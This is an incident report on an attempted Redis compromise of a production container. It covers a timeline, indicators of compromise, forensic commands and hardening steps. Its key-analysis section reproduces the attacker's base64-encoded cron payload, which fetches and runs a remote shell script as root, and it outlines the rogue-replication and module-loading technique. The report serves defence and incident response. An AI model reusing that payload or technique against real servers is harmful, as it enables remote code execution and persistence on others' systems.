# 🛡️ Redis Full Security Incident Report

**Environment:** `speechlab_redis` container on `textalize-vm` (Production)  
**Incident Range:** ~2025-10-04 → 2025-10-07  
**Severity:** 🔥 High – Exploitation Attempt with Remote Code Execution (RCE) Payload  

---

## 📑 Table of Contents

- [📌 Executive Summary](#-executive-summary)
- [📊 Timeline of Events](#-timeline-of-events)
- [🩺 Indicators of Compromise (IOCs)](#-indicators-of-compromise-iocs)
- [🧪 Malicious Keys Analysis](#-malicious-keys-analysis)
- [🧰 Redis-Level Forensic Investigation](#-redis-level-forensic-investigation)
- [🛡️ Host-Level Forensic Investigation](#-host-level-forensic-investigation)
- [🧹 Remediation & Hardening Steps](#-remediation--hardening-steps)
- [✅ Final Conclusions](#-final-conclusions)
- [📝 Post-Incident Notes](#-post-incident-notes)
- [🚀 Next Actions & Recommendations](#-next-actions--recommendations)

---

## 📌 Executive Summary

Between **2025-10-04** and **2025-10-07**, the Redis container `speechlab_redis` on production VM `textalize-vm` was targeted by unauthorized actors through a publicly exposed port `6379`.  
The attackers issued unauthorized `REPLICAOF` commands and attempted to load a malicious module (`/tmp/exp.so`) to gain **remote code execution (RCE)**.

The most critical finding was the creation of malicious keys (`backup1`, `backup2`, `backup3`, `backup4`) containing **cron payloads designed to download and execute remote scripts** from a malicious domain (`b[.]9-9-8[.]com`).  

Fortunately, host-level forensics show **no evidence of successful persistence, cron installation, or payload execution**. The intrusion was contained at the Redis layer.

---

## 📊 Timeline of Events

| Time (UTC) | Event |
|------------|-------|
| 2025-10-04 | `speechlab_redis` container started |
| 2025-10-07 03:32 | Unauthorized `REPLICAOF` command issued |
| 2025-10-07 03:33 | Attempt to load `/tmp/exp.so` (failed) |
| 2025-10-07 03:33+ | Redis config changed to write into `/etc/crontab` |
| 2025-10-07 03:33+ | Malicious keys `backup1`–`backup4` created |
| 2025-10-07 04:00 | Redis reverted to master mode |
| 2025-10-07 11:48 | Incident response initiated; port 6379 blocked |
| 2025-10-07 12:00 | Host forensics completed – no persistence found |

---

## 🩺 Indicators of Compromise (IOCs)

- **Attacker IP:** `47[.]100[.]178[.]11`  
- **Fake masters:** `8[.]219[.]207[.]211`, `47[.]237[.]137[.]33`  
- **Malicious module:** `/tmp/exp.so` (load failed)  
- **Malicious domain:** `http://b[.]9-9-8[.]com/brysj/b.sh`  
- **Malicious keys:** `backup1`, `backup2`, `backup3`, `backup4`  

---

## 🧪 Malicious Keys Analysis

### 🔥 `backup1` – Confirmed Malicious

- **Type:** `string`
- **Content:**

```bash
*/2 * * * * root echo Y2QxIGh0dHA6Ly9iLjktOS04LmNvbS9icnlzai9iLnNoCg==|base64 -d|bash|bash
```

- **Decoded Payload:**

```bash
cd1 http://b[.]9-9-8[.]com/brysj/b.sh
```

📌 **Purpose:** Attempt to install a cron job executing every 2 minutes as root, downloading and executing a remote shell script from a malicious server.

---

### 🧨 `backup2`, `backup3`, `backup4`

Likely contain similar payloads for redundancy or fallback persistence. These keys were created during the same intrusion window and should be considered **malicious**.

---

## 🧰 Redis-Level Forensic Investigation

Key commands used to investigate:

```bash
redis-cli KEYS '*'
redis-cli TYPE <key>
redis-cli GET <key>
redis-cli MEMORY USAGE <key>
redis-cli TTL <key>
redis-cli DUMP <key> | base64

docker exec -it speechlab_redis redis-cli INFO replication
docker exec -it speechlab_redis redis-cli MODULE LIST
docker exec -it speechlab_redis redis-cli CONFIG GET dir
docker exec -it speechlab_redis redis-cli CONFIG GET dbfilename
docker exec -it speechlab_redis redis-cli CONFIG GET protected-mode
docker exec -it speechlab_redis redis-cli CONFIG GET requirepass
```

---

## 🛡️ Host-Level Forensic Investigation

**File & Cron Checks:**

```bash
grep -R "9-9-8.com" /etc/cron* /var/spool/cron* 2>/dev/null
find /etc -type f -mtime -3 -ls
find /tmp /var/tmp /dev/shm -type f -newermt "4 days ago"
```

**Network Connections:**

```bash
netstat -tunp | grep ESTABLISHED
ss -tuna | grep ESTABLISHED
```

**Systemd & Persistence:**

```bash
systemctl list-unit-files --type=service | grep enabled
systemctl list-timers --all
ls -l /etc/cron.d/
cat /etc/cron.d/*
```

**User Accounts & SSH Keys:**

```bash
cat /etc/passwd | tail -n 10
ls -alh /root/.ssh/
grep -R "ssh-rsa" /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null
```

**Docker Artifacts:**

```bash
docker ps -a
docker images
```

**Log Analysis:**

```bash
grep -i "wget" /var/log/syslog /var/log/messages
grep -i "curl" /var/log/syslog /var/log/messages
grep -i "9-9-8.com" /var/log/*
```

✅ **Result:** No malicious cron files, payload downloads, or unauthorized services were found.

---

## 🧹 Remediation & Hardening Steps

1. Deleted all malicious keys (`backup1`–`backup4`).
2. Flushed Redis database and redeployed container from a clean image.
3. Removed public access to port `6379` (internal-only now).
4. Rotated all secrets and credentials stored in Redis.
5. Hardened Redis configuration:

```bash
protected-mode yes
requirepass "StrongPasswordHere"
bind 127.0.0.1
rename-command CONFIG ""
rename-command SLAVEOF ""
rename-command MODULE ""
```

6. Applied egress filtering to block malicious domains.  
7. Enabled continuous monitoring of Redis commands and logs.

---

## ✅ Final Conclusions

- The attacker **successfully wrote malicious keys** but failed to achieve persistence or code execution on the host.
- No evidence of successful cron creation, payload download, or reverse shell was found.
- The intrusion was contained within Redis and neutralized before escalation.
- Secrets should still be rotated, and monitoring must continue.

---

## 📝 Post-Incident Notes

| Field | Notes |
|-------|-------|
| Root Cause | Public Redis port (6379) exposed without password |
| Actions Taken | Port closed, Redis flushed, malicious keys removed |
| Secrets Rotated | ✅ Completed |
| Config Changes | Redis ACL + password protection |
| Remaining Risks | Possible data exposure if attacker accessed keys |
| Next Steps | Mahine replacment, internal-only Redis deployment |

---

## 🚀 Next Actions & Recommendations

- 🛡️ **Network Security:** Keep Redis internal-only; never expose `6379` to the internet.  
- 🔐 **Access Control:** Enforce strong `requirepass` and use Redis ACLs.  
- 📈 **Monitoring:** Log and alert on commands like `SLAVEOF`, `CONFIG`, `MODULE`.  
- 🧪 **Egress Control:** Block outbound access from containers except whitelisted domains.  
- 🔁 **Periodic Forensics:** Regularly dump Redis keys and scan for suspicious patterns.  
- 🔄 **Incident Readiness:** Keep a pre-built incident response script for Redis available.

---

**📌 Severity:** High – Exploitation Attempt with RCE Payload  
**📅 Report Generated:** 2025-10-07  
**Author:** Zain ul Abideen

---

